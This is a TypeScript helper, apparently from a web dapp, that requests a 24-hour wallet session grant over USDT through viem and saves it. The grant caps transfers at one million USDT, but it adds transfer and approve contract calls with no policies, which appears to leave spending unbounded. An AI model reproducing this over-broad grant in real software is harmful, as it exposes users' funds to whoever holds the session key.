import { parseUnits, type WalletClient } from "viem";
import { grantPermissions } from "viem/experimental";
import { USDT } from "@/lib/tokens";
import { saveGrant, saveSignMode, type SessionGrant } from "@/lib/session";

const SESSION_SECONDS = 24 * 60 * 60;

export async function requestSessionGrant(
  walletClient: WalletClient,
  address: string,
): Promise<SessionGrant | null> {
  const expiry = Math.floor(Date.now() / 1000) + SESSION_SECONDS;
  const result = await grantPermissions(walletClient, {
    expiry,
    permissions: [
      {
        type: "erc20-token-transfer",
        data: {
          address: USDT.address as `0x${string}`,
          ticker: "USDT",
        },
        policies: [
          {
            type: "token-allowance",
            data: { allowance: parseUnits("1000000", USDT.decimals) },
          },
        ],
        required: false,
      },
      {
        type: "contract-call",
        data: {
          address: USDT.address as `0x${string}`,
          calls: ["transfer(address,uint256)", "approve(address,uint256)"],
        },
        policies: [],
        required: false,
      },
    ],
  });
  const grant: SessionGrant = {
    address,
    expiry: result.expiry || expiry,
    permissionsContext: result.permissionsContext,
  };
  if (!grant.permissionsContext) return null;
  saveGrant(grant);
  saveSignMode(address, "session");
  return grant;
}
